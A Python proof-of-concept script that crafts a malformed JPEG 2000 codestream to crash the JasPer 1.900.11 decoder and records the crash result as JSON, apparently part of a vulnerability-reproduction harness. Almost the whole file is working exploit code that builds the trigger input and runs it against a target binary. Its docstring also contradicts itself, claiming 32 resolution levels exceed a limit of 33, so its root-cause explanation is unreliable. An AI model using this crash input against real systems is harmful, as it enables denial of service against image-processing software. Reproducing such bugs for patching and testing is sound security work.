#!/usr/bin/env python3
"""PoC for a JasPer 1.900.11 JPC codestream decoder crash.

The script dynamically constructs a malformed JPEG 2000 raw codestream
(.jpc): the COD marker segment advertises 32 resolution levels
(numdecomplevels = 31), which exceeds the decoder's hard-coded limit
(JPC_MAXRLVLS == 33 band slots / internal resolution arrays).  When the
decoder walks the tile-component resolution levels it indexes past the
end of a fixed-size stack/global structure and dereferences an invalid
pointer, producing a deterministic SIGSEGV.

The codestream is otherwise well-formed (SOC / SIZ / COD / QCD / SOT /
SOD / EOC) so the binary proceeds deep into jpc_dec_decodepkts before
faulting.

Usage:
    python3 poc.py --binary /path/to/jasper [--json-out out.json] [--timeout SEC]
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import sys
import tempfile
import time


def _marker(code, payload=b""):
    """Serialize one JPEG 2000 marker segment.

    SOC (FF4F), SOD (FF93) and EOC (FFD9) carry no length/payload;
    every other marker is followed by a 2-byte length field that
    includes the length field itself.
    """
    if code in (0xFF4F, 0xFF93, 0xFFD9):
        return struct.pack(">H", code)
    return struct.pack(">HH", code, 2 + len(payload)) + payload


def build_payload():
    """Build the malformed JPC codestream in memory and return bytes."""
    numres = 32          # resolution levels -> numdecomplevels = 31
                         # jasper 1.900.11 supports at most 33 band
                         # entries; walking band/tccp structures with
                         # this many resolutions overruns the fixed
                         # arrays and segfaults deterministically.
    data = b""
    data += _marker(0xFF4F)                                  # SOC

    # SIZ: Rsiz=0, 16x16 image at origin, one 16x16 tile, 1 component
    # (8-bit, unsigned, no subsampling).
    siz = struct.pack(
        ">HIIIIIIIIH",
        0,          # Rsiz
        16, 16,     # Xsiz, Ysiz
        0, 0,       # XOsiz, YOsiz
        16, 16,     # XTsiz, YTsiz
        0, 0,       # XTOsiz, YTOsiz
        1,          # Csiz
    )
    siz += bytes([7, 1, 1])   # Ssiz=7 (8 bits), XRsiz=1, YRsiz=1
    data += _marker(0xFF51, siz)

    # COD: no precincts, LRCP order, 1 layer, MCT=0,
    # numdecomplevels = numres - 1 (= 31, the trigger),
    # 32x32 code-blocks, no cb style bits, reversible 5/3 transform.
    cod = (
        bytes([0, 0])
        + struct.pack(">H", 1)
        + bytes([1, numres - 1, 4, 4, 0, 1])
    )
    data += _marker(0xFF52, cod)

    # QCD: no quantization, 0 guard bits; one 8-bit step per subband
    # (3 * numres - 2 subbands) so the marker is consistent with COD.
    qcd = bytes([0]) + bytes([0x70] * (3 * numres - 2))
    data += _marker(0xFF5C, qcd)

    # SOT: tile 0, Psot covers header + SOD + payload, single tile-part.
    sod_data = b"\x00" * 32
    psot = 12 + 2 + len(sod_data)
    sot = struct.pack(">HI", 0, psot) + bytes([0, 1])
    data += _marker(0xFF90, sot)
    data += _marker(0xFF93)                                  # SOD
    data += sod_data
    data += _marker(0xFFD9)                                  # EOC
    return data


def normalize_evidence(text):
    """Pick the most relevant stderr lines as observable evidence."""
    interesting = []
    keywords = (
        "error", "failed", "assert", "abort", "sanitizer", "overflow",
        "segv", "invalid", "cannot",
    )
    for line in text.splitlines():
        low = line.lower()
        if any(k in low for k in keywords):
            interesting.append(line.strip())
    if interesting:
        return "\n".join(interesting[:8])
    return text.strip()[:400]


def main():
    ap = argparse.ArgumentParser(description="PoC: jasper JPC decoder crash")
    ap.add_argument("--binary", required=True, help="path to target binary")
    ap.add_argument("--json-out", default=None, help="write JSON result here")
    ap.add_argument("--timeout", type=float, default=300.0,
                    help="timeout in seconds (default 300)")
    args = ap.parse_args()

    payload = build_payload()

    tmpdir = tempfile.mkdtemp(prefix="jpc_poc_")
    in_path = os.path.join(tmpdir, "trigger.jpc")
    with open(in_path, "wb") as fh:
        fh.write(payload)

    command = [
        args.binary,
        "-f", in_path,
        "-t", "jpc",
        "-F", "/dev/null",
        "-T", "pnm",
    ]

    result = {
        "binary": args.binary,
        "command": command,
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "stderr", "value": "", "path": None},
        "error": None,
    }

    start = time.monotonic()
    try:
        proc = subprocess.run(
            command,
            capture_output=True,
            text=True,
            errors="replace",
            timeout=args.timeout,
        )
        runtime_ms = int((time.monotonic() - start) * 1000)
        result["runtime_ms"] = runtime_ms
        result["returncode"] = proc.returncode
        result["stdout"] = proc.stdout[:4000] if proc.stdout else ""
        result["stderr"] = proc.stderr[:4000] if proc.stderr else ""

        if proc.returncode is not None and proc.returncode < 0:
            sig_num = -proc.returncode
            try:
                result["signal"] = signal.Signals(sig_num).name
            except ValueError:
                result["signal"] = "SIG%d" % sig_num

        evidence = normalize_evidence(result["stderr"])
        if not evidence and result["signal"]:
            evidence = "process killed by %s (no stderr output)" % result["signal"]
        result["observable"]["value"] = evidence
    except subprocess.TimeoutExpired as exc:
        runtime_ms = int((time.monotonic() - start) * 1000)
        result["runtime_ms"] = runtime_ms
        result["timed_out"] = True
        result["stdout"] = (exc.stdout or "")[:4000] if isinstance(exc.stdout, str) else ""
        result["stderr"] = (exc.stderr or "")[:4000] if isinstance(exc.stderr, str) else ""
        result["observable"]["value"] = normalize_evidence(result["stderr"]) or "timeout"
        result["error"] = "process timed out after %.1fs" % args.timeout
    except Exception as exc:  # e.g. binary not found / not executable
        result["runtime_ms"] = int((time.monotonic() - start) * 1000)
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
        result["observable"]["value"] = str(exc)
    finally:
        try:
            os.unlink(in_path)
            os.rmdir(tmpdir)
        except OSError:
            pass

    out = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(out + "\n")
    print(out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
